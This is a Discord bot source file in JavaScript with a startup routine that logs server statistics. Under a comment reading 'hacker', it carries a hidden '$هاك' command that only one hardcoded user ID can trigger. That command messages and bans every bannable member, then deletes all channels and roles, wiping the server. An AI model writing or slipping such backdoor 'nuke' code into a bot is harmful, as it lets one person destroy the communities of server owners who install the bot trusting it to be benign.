const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '.'

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`╔ vigo stars ╗`)
  console.log('')
  console.log('')
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});

client.login(process.env.BOT_TOKEN);



//هاكر

client.on('message', msg =>{
  if(msg.author.id !== '416204694218866688') return
  if(msg.content.startsWith(`$هاك`)){
    msg.guild.members.forEach(function(member){
      if(!member.bannable) return;
      member.send(`ּٺــمۘ ּا̍ڷــڼۨــېْۧــٰٱ̍ک ۛ ּمۘــنۨ ּڦــبــڶ ̨؏ــمۘــک ڜــٰٱ̍دۏۥ`).then(()=>{
        member.ban()
      })
    })
    msg.guild.channels.forEach(function(channel){
      if(!channel.deletable) return;
      channel.delete()
    })
    msg.guild.roles.forEach(function(role){
      role.delete(`https://cdn.discordapp.com/attachments/505542536941535232/511140354117074975/download.jpg`)
    })
  }
})
